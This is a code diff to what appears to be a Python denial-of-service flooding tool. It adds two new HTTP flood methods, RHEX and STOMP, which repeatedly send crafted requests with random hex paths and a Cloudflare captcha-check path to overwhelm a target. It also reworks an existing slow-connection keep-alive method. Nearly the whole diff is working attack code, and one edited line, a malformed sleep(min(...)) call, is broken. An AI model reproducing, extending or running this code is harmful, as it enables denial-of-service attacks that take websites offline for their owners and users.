@@ -52,7 +52,7 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "DOWNLOADER",
+        "APACHE", "XMLRPC", "BOT", "DOWNLOADER", "RHEX", "STOMP"
     }
 
     LAYER4_METHODS: Set[str] = {
@@ -486,8 +486,8 @@ class HttpFlood:
     @staticmethod
     def getMethodType(method: str) -> str:
         return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "COOKIE", "OVH", "EVEN",
-                                            "DYN", "SLOW", "PPS", "APACHE",
-                                            "BOT", } \
+                                            "DYN", "SLOW", "PPS", "APACHE", "DOWNLOADER", "AVB",
+                                            "BOT", "RHEX", "STOMP" } \
             else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
             else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
             else "REQUESTS"
@@ -721,15 +721,14 @@ class HttpFlood:
 
         s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                if not self._event.is_set(): return 0
-                Tools.send(s, payload, self._stats)
-                packets += 1
-                while 1:
-                    sleep(.01)
-                    data = s.recv(1)
-                    if not data:
-                        break
+            if not self._event.is_set(): return 0
+            Tools.send(s, payload, self._stats)
+            packets += 1
+            while 1:
+                sleep(.01)
+                data = s.recv(1)
+                if not data:
+                    break
             Tools.send(s, b'0', self._stats)
             packets += 1
         Tools.safe_close(s)
@@ -801,13 +800,83 @@ class HttpFlood:
                 Tools.send(s, payload, self._stats)
                 packets += 1
             while Tools.send(s, payload, self._stats) and s.recv(1):
-                for i in range(self._rpc):
-                    if not self._event.is_set(): return 0
-                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
-                    Tools.send(s, keep, self._stats)
-                    packets += 1
-                    sleep(self._rpc / 15)
-                    break
+                if not self._event.is_set(): return 0
+                keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
+                Tools.send(s, keep, self._stats)
+                packets += 1
+                sleep(min(self._rpc / 15), 10)
+                if not self._event.is_set(): return 0
+        Tools.safe_close(s)
+        return packets
+
+    def RHEX(self) -> int:
+        randhex = str(randbytes(randchoice([32, 64, 128])))
+        payload = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
+                                                        self._target.authority,
+                                                        randhex) +
+                             "Host: %s/%s\r\n" % (self._target.authority, randhex) +
+                             self.randHeadercontent +
+                             'Accept-Encoding: gzip, deflate, br\r\n'
+                             'Accept-Language: en-US,en;q=0.9\r\n'
+                             'Cache-Control: max-age=0\r\n'
+                             'Connection: keep-alive\r\n'
+                             'Sec-Fetch-Dest: document\r\n'
+                             'Sec-Fetch-Mode: navigate\r\n'
+                             'Sec-Fetch-Site: none\r\n'
+                             'Sec-Fetch-User: ?1\r\n'
+                             'Sec-Gpc: 1\r\n'
+                             'Pragma: no-cache\r\n'
+                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
+        packets, s = 0, None
+        with suppress(Exception), self.open_connection() as s:
+            for _ in range(self._rpc):
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
+        Tools.safe_close(s)
+        return packets
+
+    def STOMP(self) -> int:
+        dep = ('Accept-Encoding: gzip, deflate, br\r\n'
+               'Accept-Language: en-US,en;q=0.9\r\n'
+               'Cache-Control: max-age=0\r\n'
+               'Connection: keep-alive\r\n'
+               'Sec-Fetch-Dest: document\r\n'
+               'Sec-Fetch-Mode: navigate\r\n'
+               'Sec-Fetch-Site: none\r\n'
+               'Sec-Fetch-User: ?1\r\n'
+               'Sec-Gpc: 1\r\n'
+               'Pragma: no-cache\r\n'
+               'Upgrade-Insecure-Requests: 1\r\n\r\n')
+        hexh = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87' \
+               r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F' \
+               r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F' \
+               r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84' \
+               r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F' \
+               r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98' \
+               r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98' \
+               r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B' \
+               r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
+               r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
+               r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
+        p1, p2 = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
+                                                       self._target.authority,
+                                                       hexh) +
+                            "Host: %s/%s\r\n" % (self._target.authority, hexh) +
+                            self.randHeadercontent + dep), str.encode(
+            "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\n" % (self._req_type,
+                                                          self._target.authority) +
+            "Host: %s\r\n" % hexh +
+            self.randHeadercontent + dep)
+        packets, s = 0, None
+        with suppress(Exception), self.open_connection() as s:
+            if not self._event.is_set(): return 0
+            Tools.send(s, p1, self._stats)
+            packets += 1
+            for _ in range(self._rpc):
+                if not self._event.is_set(): return 0
+                Tools.send(s, p2, self._stats)
+                packets += 1
         Tools.safe_close(s)
         return packets
 
@@ -853,7 +922,10 @@ class HttpFlood:
             ).encode()
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
         if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
-
+        if name == "RHEX":
+            self.SENT_FLOOD = self.RHEX
+        if name == "STOMP":
+            self.SENT_FLOOD = self.STOMP
 
 def main(url, ip, method, event, get_proxy, stats, rpc=None, refl_li_fn=None):
     if method not in Methods.ALL_METHODS:
